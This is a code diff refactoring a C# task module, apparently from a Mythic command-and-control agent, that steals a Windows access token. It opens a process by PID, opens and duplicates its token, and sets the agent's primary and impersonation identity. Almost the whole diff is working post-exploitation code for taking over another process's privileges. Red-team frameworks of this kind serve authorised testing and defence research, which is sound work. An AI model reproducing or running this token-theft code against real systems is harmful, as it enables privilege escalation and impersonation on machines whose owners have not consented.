@@ -46,73 +46,79 @@ namespace Tasks
             _pCloseHandle = _agent.GetApi().GetLibraryFunction<CloseHandle>(Library.KERNEL32, "CloseHandle");
         }
 
-        public override ST.Task CreateTasking()
+
+        public override void Start()
         {
-            return new ST.Task(() =>
+            string errorMessage = "";
+            TaskResponse resp = new TaskResponse { };
+            IntPtr procHandle = IntPtr.Zero;
+            IntPtr hImpersonationToken = IntPtr.Zero;
+            IntPtr hProcessToken = IntPtr.Zero;
+            try
             {
-                string errorMessage = "";
-                TaskResponse resp = new TaskResponse { };
-                IntPtr procHandle = IntPtr.Zero;
-                IntPtr hImpersonationToken = IntPtr.Zero;
-                IntPtr hProcessToken = IntPtr.Zero;
-                try
+                procHandle = System.Diagnostics.Process.GetProcessById((int) Convert.ToInt32(_data.Parameters)).Handle;
+            }
+            catch (Exception ex)
+            {
+                errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
+            }
+
+            if (procHandle != IntPtr.Zero)
+            {
+                _agent.GetTaskManager().AddTaskResponseToQueue(
+                    CreateTaskResponse("", false, "", new IMythicMessage[]
+                    {
+                        Artifact.ProcessOpen(int.Parse(_data.Parameters))
+                    }));
+                bool bRet = _pOpenProcessToken(
+                    procHandle,
+                    TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query,
+                    out hProcessToken);
+                if (!bRet)
                 {
-                    procHandle = System.Diagnostics.Process.GetProcessById((int)Convert.ToInt32(_data.Parameters)).Handle;
+                    errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
                 }
-                catch (Exception ex)
+                else
                 {
-                    errorMessage = $"Failed to acquire process handle to {_data.Parameters}: {ex.Message}";
-                }
-                if (procHandle != IntPtr.Zero)
-                {
-                    _agent.GetTaskManager().AddTaskResponseToQueue(
-                        CreateTaskResponse("", false, "", new IMythicMessage[] {
-                            Artifact.ProcessOpen(int.Parse(_data.Parameters))
-                        }));
-                    bool bRet = _pOpenProcessToken(
-                        procHandle,
-                        TokenAccessLevels.Duplicate | TokenAccessLevels.AssignPrimary | TokenAccessLevels.Query,
-                        out hProcessToken);
+                    _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
+                    bRet = _pDuplicateTokenEx(
+                        hProcessToken,
+                        TokenAccessLevels.MaximumAllowed,
+                        IntPtr.Zero,
+                        TokenImpersonationLevel.Impersonation,
+                        1, // TokenImpersonation
+                        out hImpersonationToken);
                     if (!bRet)
                     {
-                        errorMessage = $"Failed to open process token: {Marshal.GetLastWin32Error()}";
-                    } else
-                    {
-                        _agent.GetIdentityManager().SetPrimaryIdentity(hProcessToken);
-                        bRet = _pDuplicateTokenEx(
-                            hProcessToken,
-                            TokenAccessLevels.MaximumAllowed,
-                            IntPtr.Zero,
-                            TokenImpersonationLevel.Impersonation,
-                            1, // TokenImpersonation
-                            out hImpersonationToken);
-                        if (!bRet)
-                        {
-                            errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
-                        } else
-                        {
-                            _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
-                            var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
-                            resp = CreateTaskResponse(
-                                $"Successfully impersonated {cur.Name}",
-                                true);
-                        }
+                        errorMessage = $"Failed to duplicate token for impersonation: {Marshal.GetLastWin32Error()}";
                     }
-                } 
-                if (!string.IsNullOrEmpty(errorMessage))
-                {
-                    resp = CreateTaskResponse(errorMessage, true, "error");
+                    else
+                    {
+                        _agent.GetIdentityManager().SetImpersonationIdentity(hImpersonationToken);
+                        var cur = _agent.GetIdentityManager().GetCurrentImpersonationIdentity();
+                        resp = CreateTaskResponse(
+                            $"Successfully impersonated {cur.Name}",
+                            true);
+                    }
                 }
-                if (hProcessToken != IntPtr.Zero)
-                {
-                    _pCloseHandle(hProcessToken);
-                }
-                if (hImpersonationToken != IntPtr.Zero)
-                {
-                    _pCloseHandle(hImpersonationToken);
-                }
-                _agent.GetTaskManager().AddTaskResponseToQueue(resp);
-            }, _cancellationToken.Token);
+            }
+
+            if (!string.IsNullOrEmpty(errorMessage))
+            {
+                resp = CreateTaskResponse(errorMessage, true, "error");
+            }
+
+            if (hProcessToken != IntPtr.Zero)
+            {
+                _pCloseHandle(hProcessToken);
+            }
+
+            if (hImpersonationToken != IntPtr.Zero)
+            {
+                _pCloseHandle(hImpersonationToken);
+            }
+
+            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
         }
     }
 }
